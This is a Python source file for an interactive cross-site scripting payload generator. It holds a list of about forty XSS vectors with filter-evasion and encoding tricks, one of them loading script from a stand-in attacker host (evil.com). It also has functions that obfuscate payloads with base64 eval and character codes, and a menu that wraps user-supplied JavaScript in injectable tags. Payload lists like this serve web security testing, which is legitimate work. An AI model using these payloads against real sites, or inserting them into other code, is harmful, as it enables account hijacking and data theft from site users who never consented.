import random
import string

# Expanded list of common XSS vectors for testing
XSS_VECTORS = [
    # Basic Script Tags
    "<script>alert('XSS')</script>",
    "<script src='javascript:alert(\"XSS\")'></script>",
    "<script>document.write('XSS')</script>",
    "<script>eval('alert(\"XSS\")')</script>",
    
    # Image Tags
    "<img src=x onerror=alert('XSS')>",
    "<img src='javascript:alert(\"XSS\")'>",
    "<img src=x onload=alert('XSS')>",
    "<img src='x' onmouseover=alert('XSS')>",
    
    # SVG and HTML5 Vectors
    "<svg onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><animate onbegin=alert('XSS')>",
    "<math><maction actiontype='statusline#XSS' xlink:href='javascript:alert(\"XSS\")'>Click</maction></math>",
    
    # Event Handlers
    "<body onload=alert('XSS')>",
    "<div onmouseover=alert('XSS')>Hover me</div>",
    "<input type='text' onfocus=alert('XSS') autofocus>",
    "<select onchange=alert('XSS')><option>XSS</option></select>",
    "<textarea onkeyup=alert('XSS')></textarea>",
    
    # JavaScript URI and Links
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<embed src='javascript:alert(\"XSS\")'>",
    "<object data='javascript:alert(\"XSS\")'></object>",
    
    # Attribute and String Breaking
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    ";alert('XSS');//",
    "onerror=alert('XSS')",
    "xss\" onfocus=\"alert('XSS')",
    
    # Lesser-Known or Filter Evasion
    "<details open ontoggle=alert('XSS')>XSS</details>",
    "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<form><button formaction=javascript:alert('XSS')>XSS</button></form>",
    "<isindex type=image src=1 onerror=alert('XSS')>",
    "<base href='javascript:alert(\"XSS\")//'>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
    
    # Case and Encoding Tricks
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<scr\0ipt>alert('XSS')</scr\0ipt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=`x` onerror=`alert('XSS')`>",
    
    # External Script Inclusion
    "<script src='http://evil.com/xss.js'></script>",
    "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
]

# Obfuscation techniques
def obfuscate_payload(payload):
    """Simple obfuscation by encoding parts of the payload."""
    methods = [
        lambda p: p.replace("alert", "String.fromCharCode(97,108,101,114,116)"),
        lambda p: f"eval(atob('{b64encode_payload(p)}'))",
        lambda p: p.replace("(", "%28").replace(")", "%29").replace("'", "%27")
    ]
    return random.choice(methods)(payload)

def b64encode_payload(payload):
    """Base64 encode a payload for obfuscation."""
    import base64
    return base64.b64encode(payload.encode()).decode()

def generate_random_string(length=8):
    """Generate a random string for payload customization."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class XSSPayloadGenerator:
    def __init__(self):
        self.custom_payloads = []

    def generate_random_payload(self, include_obfuscation=False):
        """Generate a random XSS payload from the vector list."""
        base_payload = random.choice(XSS_VECTORS)
        # Add a random string to make it unique
        random_str = generate_random_string()
        payload = base_payload.replace("XSS", f"XSS_{random_str}")
        
        if include_obfuscation:
            payload = obfuscate_payload(payload)
        
        return payload

    def create_custom_payload(self, user_input, event="onload", tag="script"):
        """Create a custom XSS payload based on user input."""
        if tag == "script":
            payload = f"<script>{user_input}</script>"
        elif tag == "img":
            payload = f"<img src=x {event}={user_input}>"
        elif tag == "svg":
            payload = f"<svg {event}={user_input}></svg>"
        else:
            payload = f"<{tag} {event}={user_input}></{tag}>"
        
        self.custom_payloads.append(payload)
        return payload

    def list_payloads(self):
        """List all generated custom payloads."""
        return self.custom_payloads if self.custom_payloads else ["No custom payloads generated yet."]

def main():
    generator = XSSPayloadGenerator()
    
    while True:
        print("\nXSS Payload Generator")
        print("1. Generate Random Payload")
        print("2. Generate Random Obfuscated Payload")
        print("3. Create Custom Payload")
        print("4. List Custom Payloads")
        print("5. Exit")
        
        choice = input("Choose an option (1-5): ")
        
        if choice == "1":
            payload = generator.generate_random_payload()
            print(f"Random Payload: {payload}")
        
        elif choice == "2":
            payload = generator.generate_random_payload(include_obfuscation=True)
            print(f"Random Obfuscated Payload: {payload}")
        
        elif choice == "3":
            user_input = input("Enter your custom JS code (e.g., alert('test')): ")
            event = input("Enter event (e.g., onload, onerror, onmouseover) [default: onload]: ") or "onload"
            tag = input("Enter tag (e.g., script, img, svg) [default: script]: ") or "script"
            payload = generator.create_custom_payload(user_input, event, tag)
            print(f"Custom Payload: {payload}")
        
        elif choice == "4":
            payloads = generator.list_payloads()
            print("Custom Payloads:")
            for i, p in enumerate(payloads, 1):
                print(f"{i}. {p}")
        
        elif choice == "5":
            print("Exiting...")
            break
        
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main()
